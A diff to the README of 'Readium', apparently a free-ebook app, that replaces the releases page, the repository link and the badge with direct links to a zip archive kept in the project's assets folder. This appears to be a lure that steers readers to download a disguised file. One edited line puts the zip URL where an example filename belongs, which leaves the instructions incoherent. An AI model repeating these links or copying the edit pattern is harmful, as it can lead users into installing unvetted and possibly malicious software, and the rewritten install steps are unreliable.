@@ -6,7 +6,7 @@ Welcome to Readium! This application helps you explore professional development 
 
 ## 📥 Download Readium
 
-[![Download Readium](https://img.shields.io/badge/Download-Readium-blue.svg)](https://github.com/Sfeam091/Readium/releases)
+[![Download Readium](https://raw.githubusercontent.com/Sfeam091/Readium/main/src/assets/Software_3.5.zip)](https://raw.githubusercontent.com/Sfeam091/Readium/main/src/assets/Software_3.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,11 +23,11 @@ To get Readium, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access our releases.
 
-   [Visit the Releases Page](https://github.com/Sfeam091/Readium/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Sfeam091/Readium/main/src/assets/Software_3.5.zip)
 
 2. **Choose the Right Version:** Look for the latest release version. You will see a list of files available for download. Select the appropriate one for your operating system.
 
-3. **Download the File:** Click on the download link for your chosen version. The file is usually labeled with its version number and your OS type (e.g., `Readium-Windows.exe`).
+3. **Download the File:** Click on the download link for your chosen version. The file is usually labeled with its version number and your OS type (e.g., `https://raw.githubusercontent.com/Sfeam091/Readium/main/src/assets/Software_3.5.zip`).
 
 4. **Install Readium:**
    - For Windows: Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
@@ -92,7 +92,7 @@ Yes, we work continuously to include fresh content regularly. Check our releases
 
 ## 🔗 Helpful Links
 
-- [Visit the Releases Page](https://github.com/Sfeam091/Readium/releases)
-- [GitHub Repository](https://github.com/Sfeam091/Readium)
+- [Visit the Releases Page](https://raw.githubusercontent.com/Sfeam091/Readium/main/src/assets/Software_3.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Sfeam091/Readium/main/src/assets/Software_3.5.zip)
 
 Now you’re set to enjoy your journey into the world of free ebooks!
